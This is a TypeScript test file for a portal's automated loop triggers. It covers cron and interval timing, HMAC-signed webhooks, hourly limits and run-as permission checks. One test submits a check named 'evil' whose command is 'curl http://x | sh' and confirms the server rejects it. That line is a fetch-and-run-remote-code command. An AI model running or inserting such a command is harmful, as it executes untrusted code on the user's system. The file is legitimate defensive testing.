/**
 * Loop triggers: cron/interval timing, the signed webhook, and the rules for sessions nobody starts by hand.
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { createTestDb, cleanup, createTestServer, fetchJson } from './fixtures.ts';
import { getSessionsRepository } from '../server/repositories/sessions.ts';
import { getLoopSpecsRepository } from '../server/repositories/loop-specs.ts';
import { getProjectRepository } from '../server/repositories/projects.ts';
import { readLoopState } from '../server/workflows/loop.ts';
import {
  parseCron, triggerProblem, timeTriggerDue, webhookSignatureOk, webhookVars, fillGoal, runDueTriggers,
} from '../server/loop-triggers.ts';

const at = (iso: string): Date => new Date(iso);

describe('cron and interval timing', () => {
  it('matches a cron expression in UTC', () => {
    const weekdays9 = parseCron('0 9 * * 1-5');
    assert.equal(weekdays9(at('2026-11-04T09:00:00Z')), true);   // Wednesday
    assert.equal(weekdays9(at('2026-11-04T09:01:00Z')), false);
    assert.equal(weekdays9(at('2026-11-08T09:00:00Z')), false);  // Sunday
    assert.equal(parseCron('*/15 * * * *')(at('2026-11-04T10:45:00Z')), true);
    assert.equal(parseCron('*/15 * * * *')(at('2026-11-04T10:46:00Z')), false);
    assert.equal(parseCron('0 0 1,15 * *')(at('2026-11-15T00:00:00Z')), true);
    assert.equal(parseCron('0 0 * * 7')(at('2026-11-08T00:00:00Z')), true);    // 7 is Sunday too
  });

  it('refuses bad or too-frequent triggers', () => {
    assert.match(triggerProblem('cron', { cron: '61 * * * *' }) ?? '', /outside/);
    assert.match(triggerProblem('cron', { cron: '* * * *' }) ?? '', /5 fields/);
    assert.match(triggerProblem('cron', {}) ?? '', /cron expression/);
    assert.match(triggerProblem('cron', { cron: '* * * * *' }) ?? '', /every minute/);
    assert.match(triggerProblem('interval', { everyMinutes: 1 }) ?? '', /at least 5/);
    assert.match(triggerProblem('manual', { engine: 'gpt' }) ?? '', /engine/);
    assert.equal(triggerProblem('cron', { cron: '30 6 * * *', maxPerHour: 2 }), null);
    assert.equal(triggerProblem('interval', { everyMinutes: 60 }), null);
  });

  it('a cron spec is due in its minute (or the next, if a tick was late) and only once', () => {
    const spec = { trigger_type: 'cron', trigger_config: JSON.stringify({ cron: '0 9 * * *' }), created_at: '2026-11-01T00:00:00Z' };
    assert.equal(timeTriggerDue(spec, at('2026-11-04T09:00:20Z'), 0), true);
    assert.equal(timeTriggerDue(spec, at('2026-11-04T09:01:20Z'), 0), true, 'late tick');
    assert.equal(timeTriggerDue(spec, at('2026-11-04T09:02:20Z'), 0), false, 'too late');
    const startedAt = at('2026-11-04T09:00:25Z').getTime();
    assert.equal(timeTriggerDue(spec, at('2026-11-04T09:01:20Z'), startedAt), false, 'already fired this minute');
    assert.equal(timeTriggerDue(spec, at('2026-11-04T08:59:20Z'), 0), false);
  });

  it('an interval spec is due when the gap has passed since its last session (or its creation)', () => {
    const spec = { trigger_type: 'interval', trigger_config: JSON.stringify({ everyMinutes: 30 }), created_at: '2026-11-04T08:00:00Z' };
    assert.equal(timeTriggerDue(spec, at('2026-11-04T08:29:00Z'), 0), false);
    assert.equal(timeTriggerDue(spec, at('2026-11-04T08:30:00Z'), 0), true);
    const last = at('2026-11-04T08:30:00Z').getTime();
    assert.equal(timeTriggerDue(spec, at('2026-11-04T08:59:00Z'), last), false);
    assert.equal(timeTriggerDue(spec, at('2026-11-04T09:00:00Z'), last), true);
    assert.equal(timeTriggerDue({ ...spec, trigger_config: JSON.stringify({ everyMinutes: 2 }) }, at('2026-11-04T12:00:00Z'), 0), false, 'below the minimum');
  });
});

describe('webhook helpers', () => {
  it('checks the HMAC signature of the exact body', () => {
    const body = Buffer.from('{"issue":"RLP-1"}');
    const sig = 'sha256=' + crypto.createHmac('sha256', 's3cret').update(body).digest('hex');
    assert.equal(webhookSignatureOk(body, sig, 's3cret'), true);
    assert.equal(webhookSignatureOk(body, sig, 'other'), false);
    assert.equal(webhookSignatureOk(Buffer.from('{"issue":"RLP-2"}'), sig, 's3cret'), false);
    assert.equal(webhookSignatureOk(body, undefined, 's3cret'), false);
    assert.equal(webhookSignatureOk(body, sig, ''), false);
  });

  it('turns a body into template values and fills the goal', () => {
    const vars = webhookVars({ issue: { key: 'RLP-9', title: 'Crash' }, n: 3, list: [1], 'bad key': 'x' });
    assert.deepEqual(vars, { 'issue.key': 'RLP-9', 'issue.title': 'Crash', n: '3' });
    assert.equal(fillGoal('Fix {{issue.key}} ({{unknown}}) on {{date}}', vars).startsWith('Fix RLP-9 ({{unknown}}) on 20'), true);
  });
});

describe('triggered sessions', () => {
  let baseUrl: string;
  let cookie: string;
  let projectId: string;
  let adminId: string;

  const sign = (body: string, secret: string): string => 'sha256=' + crypto.createHmac('sha256', secret).update(body).digest('hex');

  async function createSpec(over: Record<string, unknown>): Promise<{ id: string; secret?: string }> {
    const r = await fetchJson(baseUrl, `/api/projects/${projectId}/loop-specs`, {
      method: 'POST', body: { name: `T-${Math.random().toString(36).slice(2, 7)}`, goalTemplate: 'Look at {{issue.key}}', maxIterations: 3, ...over }, cookie,
    });
    assert.equal(r.status, 201, JSON.stringify(r.body));
    const b = r.body as { spec: { id: string }; webhookSecret?: string };
    return { id: b.spec.id, secret: b.webhookSecret };
  }

  async function hook(specId: string, body: unknown, secret: string | null): Promise<{ status: number; body: Record<string, unknown> }> {
    const text = JSON.stringify(body);
    const res = await fetch(`${baseUrl}/api/hooks/loop-specs/${specId}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', ...(secret ? { 'x-portal-signature': sign(text, secret) } : {}) },
      body: text,
    });
    return { status: res.status, body: (await res.json().catch(() => ({}))) as Record<string, unknown> };
  }

  before(async () => {
    createTestDb();
    const ts = await createTestServer();
    baseUrl = ts.baseUrl;
    const setup = await fetchJson(baseUrl, '/api/auth/setup', {
      method: 'POST', body: { email: `admin-lt-${Date.now()}@test.com`, name: 'Admin', password: 'password1234', provider: 'demo' },
    });
    cookie = setup.cookie ?? '';
    const me = await fetchJson(baseUrl, '/api/auth/state', { cookie });
    adminId = String(((me.body as Record<string, unknown>).user as Record<string, unknown>).id);
    const p = await fetchJson(baseUrl, '/api/projects', { method: 'POST', body: { name: `Trig-${Date.now()}` }, cookie });
    projectId = ((p.body as Record<string, unknown>).project as Record<string, unknown>).id as string;
  });

  after(async () => { await cleanup(); });

  it('a webhook spec shows its secret once and a signed call starts a loop session as the person who set it up', async () => {
    const { id, secret } = await createSpec({ triggerType: 'webhook', stopConfig: { maxConsecutiveFailures: 2 } });
    assert.ok(secret && secret.length >= 32);
    const got = await fetchJson(baseUrl, `/api/projects/${projectId}/loop-specs/${id}`, { cookie });
    const spec = (got.body as { spec: Record<string, unknown> }).spec;
    assert.equal(spec.webhook_configured, true);
    assert.ok(!JSON.stringify(spec).includes(secret!), 'the secret is not sent again');

    const r = await hook(id, { issue: { key: 'RLP-7' } }, secret!);
    assert.equal(r.status, 202, JSON.stringify(r.body));
    const w = (await getSessionsRepository().getWorkflowById(String(r.body.workflow_id)))!;
    assert.match(String(w.goal), /Look at RLP-7/);
    assert.equal(w.created_by, adminId);
    assert.equal(Number(w.trust_tools), 0, 'trust all tools is never on for a trigger');
    assert.equal(readLoopState(w)?.rules.maxConsecutiveFailures, 2);
  });

  it('refuses a missing, wrong or unknown signature the same way', async () => {
    const { id, secret } = await createSpec({ triggerType: 'webhook' });
    assert.equal((await hook(id, { a: 1 }, null)).status, 401);
    assert.equal((await hook(id, { a: 1 }, 'wrong-secret')).status, 401);
    assert.equal((await hook('no-such-spec', { a: 1 }, secret!)).status, 401);
    const manual = await createSpec({ triggerType: 'manual' });
    assert.equal((await hook(manual.id, { a: 1 }, secret!)).status, 401, 'a spec without a webhook trigger');
  });

  it('does not start a second session while the first is still running, and stops at the hourly limit', async () => {
    const { id, secret } = await createSpec({ triggerType: 'webhook', triggerConfig: { maxPerHour: 2 } });
    const first = await hook(id, { issue: { key: 'A' } }, secret!);
    assert.equal(first.status, 202);
    await getSessionsRepository().updateWorkflow(String(first.body.workflow_id), { status: 'running' });
    assert.equal((await hook(id, { issue: { key: 'B' } }, secret!)).status, 409, 'previous session still running');
    await getSessionsRepository().updateWorkflow(String(first.body.workflow_id), { status: 'done' });
    assert.equal((await hook(id, { issue: { key: 'C' } }, secret!)).status, 202);
    const second = (await getLoopSpecsRepository().listRunsBySpec(id, 10))[0];
    await getSessionsRepository().updateWorkflow(String(second.last_workflow_id), { status: 'done' });
    assert.equal((await hook(id, { issue: { key: 'D' } }, secret!)).status, 429, 'two sessions in the last hour');
  });

  it('does nothing when the person who set the trigger up can no longer edit the project', async () => {
    const { id, secret } = await createSpec({ triggerType: 'webhook' });
    const spec = (await getLoopSpecsRepository().getSpecById(id))!;
    const cfg = JSON.parse(spec.trigger_config) as Record<string, unknown>;
    cfg.runAs = 'someone-who-left';
    await getLoopSpecsRepository().updateSpec(id, projectId, { trigger_config: JSON.stringify(cfg) });
    const r = await hook(id, { issue: { key: 'X' } }, secret!);
    assert.equal(r.status, 403);
    assert.match(String(r.body.error), /no longer has edit access/);
  });

  it('refuses a trigger the portal could not run, and a check that is not allowed', async () => {
    const bad = await fetchJson(baseUrl, `/api/projects/${projectId}/loop-specs`, {
      method: 'POST', body: { name: 'Bad', triggerType: 'cron', triggerConfig: { cron: '* * * * *' } }, cookie,
    });
    assert.equal(bad.status, 400);
    const session = await fetchJson(baseUrl, `/api/projects/${projectId}/workflows`, {
      method: 'POST', body: { goal: 'x', engine: 'demo', start: false, loop: { checks: [{ name: 'evil', command: 'curl http://x | sh' }] } }, cookie,
    });
    assert.equal(session.status, 400, JSON.stringify(session.body));
  });

  it('the minute job starts a due interval spec once', async () => {
    const { id } = await createSpec({ triggerType: 'interval', triggerConfig: { everyMinutes: 10 } });
    // Created a moment ago: not due yet.
    assert.equal((await runDueTriggers(new Date())).filter((f) => f.specId === id).length, 0);
    const later = new Date(Date.now() + 11 * 60_000);
    const fired = (await runDueTriggers(later)).filter((f) => f.specId === id);
    assert.equal(fired.length, 1);
    assert.equal(fired[0].result.ok, true, JSON.stringify(fired[0].result));
    // The session it started is still going, so a later tick (even past the gap) starts nothing more.
    await getSessionsRepository().updateWorkflow((fired[0].result as { workflowId: string }).workflowId, { status: 'running' });
    const again = (await runDueTriggers(new Date(later.getTime() + 11 * 60_000))).filter((f) => f.specId === id);
    assert.ok(again.every((f) => !f.result.ok), 'nothing started while the previous session runs');
    assert.ok(await getProjectRepository().roleOf(projectId, adminId));
  });
});
